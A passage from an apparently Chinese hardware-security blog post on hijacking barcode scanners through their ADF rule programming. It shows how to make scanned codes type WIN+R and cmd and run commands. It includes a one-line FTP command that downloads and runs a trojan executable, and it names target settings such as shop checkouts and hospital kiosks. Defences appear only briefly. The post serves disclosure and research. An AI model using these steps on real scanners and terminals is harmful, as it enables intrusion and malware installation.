纯数字，想要在这个结账系统中识别就要在输入前进行处理。再举个例子：条形码的数据：8523647122通过ADF输出的数据：8523641&amp;lt;Enter&amp;gt;如何实现ADF？ 现在网上仍然没有ADF的中文资料，而在外国的网站也寥寥无几，无人问津，但靠tk的ppt中提到的ADF也是一头雾水，因为没有具体技术描述，只是一行字带过。后来找到一份摩托罗拉撰写300多页的ADF指南PDF。ADF是一种编程，根据自己的需求构建规则，而用的就不是用代码进行编程而是条形码。ADF把所有规则都用条形码表示，例如Perfix/Suffix，Replace，字符输入等。利用ADF挟持扫描器数据对扫描器进行ADF设置时要先扫描开始模式，Begin New Rule 此后开始扫描的条形码都会被添加规则，前提是规则的逻辑是合法的。随后依次扫描下列条形码 然后Save Rule 当Save Rule，扫描器的输出数据都会被挟持成“TEST”，当你设置了ADF时，就会把你的规则按流程一步一步执行。如何恢复？ 扫描清除所有规则条形码即可。 利用ADF执行命令，种植木马由于单凭控制字符无法执行命令，而ADF支持简单的编程和更多的键，利用ADF可以轻松执行系统命令。由于ADF支持很多键，例如最有用的WIN+R。 在ADF中称为GUI R，既然知道了可以WIN+R的键，利用上面的规则就可以弹出cmd执行了。但这样还是不行，因为输入的是由系统自动输入，速度是手打无法可比的，当你执行到GUI R，再执行”c”,”m”,”d”， win+r的对话框还没有出来就已经输入了cmd，所有要延时，而ADF就支持，相当于编程中的 sleep()。 在录ADF规则时，扫描延时后要输入两个Numeric，例如依次0和1两个码，就代表延时0.1秒，0和5就代表0.5秒，默认是延时1秒。知道这些ADF条形码后就可以构建弹出cmd，然后再利用控制字符执行命令，主要是Enter。但如果要按照以上这么搞的话，仅是弹出一个cmd窗口就要十多个条形码了，也就是说扫描器要扫十多次。可以先看看腾讯玄武实验室的demo视频：https://twitter.com/tombkeeper/status/663730674017300480视频中用了一叠条形码，依次扫描，扫描了十多次就出来个cmd，可能这与扫描器型号也有关系。 这样的话不管是规则生成和利用都非常繁琐，其实是可以优化的，ADF的规则可以合并。利用motorola的扫描器。 123scan是摩托罗拉官方出品非常强大的扫描器 管理软件，在其官网可以下载。功能很多，在这里就介绍利用123scan设置ADF。打开后点击”Create new configuration file”-&gt;”My scanner is NOTconnected”-&gt;选择扫描器-&gt;”Mondify data”-&gt;”Program complex data modifications”-&gt;”Create a new rule”。 点击Add action就是添加规则。 ADF所有规则都在里面，包括Beep控制（控制扫描器蜂鸣），Replace等。 设置延时0.5秒，依次添加规则。 最后会自动合并条形码并输出。 以上就是执行任意命令的条形码payload，除去1和2的设置出厂设置和清除所有规则，只需要4个条形码就可以执行任意单条命令。其中SendALL that remains是代表设置ADF后扫描条形码的原本数据。以上四组条形码的ADF流程是:输入WIN+R键-&gt;延时0.5秒-&gt;输入c键-&gt;输入m键-&gt;输入d键-&gt;输入回车-&gt;延时0.5秒-&gt;执行条形码的内容，而随后的Send ALL thatremains就是你要执行的命令，可以多行命令，要是单行命令基本上4条就够不需要加Send ALL that remains。利用ADF种植木马既然已经可以执行cmd命令，最简单的方法就是利用ftp下载执行任意程序。上面提到的Send ALL that remains可以用BarTender生成出FTP命令。 #!bash ftp test?CR?a?CR?a?CR?get w.exe?CR?bye?CR?w.exe?CR?get w.exe?CR?bye?CR?w.exe?CR? 下面给出我们的demo视频，是已经经过扫描四次ADF设置后。不管扫描什么条形码执行到Send ALL that remains。视频中是利用FTP命令执行。（测试型号Symbol-LS4208-SR20001ZZR）http://v.youku.com/v_show/id_XMTQ0ODY0ODg1Ng==.html?from=y1.7-1.2密码:wooyun520 攻击场景简单总结一下可能存在攻击的场景地点: 商店付款 直接把条形码替换到商品；很多便利店支持微信，支付宝二维码支付，扫描器也支持多个类型条形码，可以直接把条形码存在手机中，让其扫描；有些大型百货有资助价格查询终端，只要用特殊的条形码到终端一扫就能跳出终端。 医院病历，检验单 现在医院的挂号，病历都会有个条形码，直接到医院自主终端或直接递给护士扫描；去医院都知道，有资助出检验单的终端，只要一扫就会单子，基本每个医院都有了。 彩票 彩票自身都会有条形码，兑换彩票就凭靠条形码到机器识别，所以伪造或对检验机进行攻击还是有可能，彩票终端类型这么多。 快递单子 快递都有条形码，一般是code128或者code39类型。在一些快递自助取件柜，和快递小哥扫描的时候或许会出现风险。 。。。。。。场景很多就不一一列举了，以上场景有空我会逐一分析。 防范方法 扫码器默认不要开启ADF功能 扫描器尽量不要使用键盘模拟 设置热键黑名单 总结一维条形码攻击的概念在国外很多年前就有提出了，但是没人深入研究。利用条形码也可能出现SQL注射，XSS，溢出等攻击。无论什么设备，只要能控制一部分输入，就存在风险！ 参考文献 http://www.appsbarcode.com/code%20128.php Code 128 條碼．編碼規則 http://www.slideshare.net/mobile/PacSecJP/hyperchem-ma-ba","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"条形码","slug":"条形码","permalink":"http://www.future-sec.com/tags/条形码/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]}]}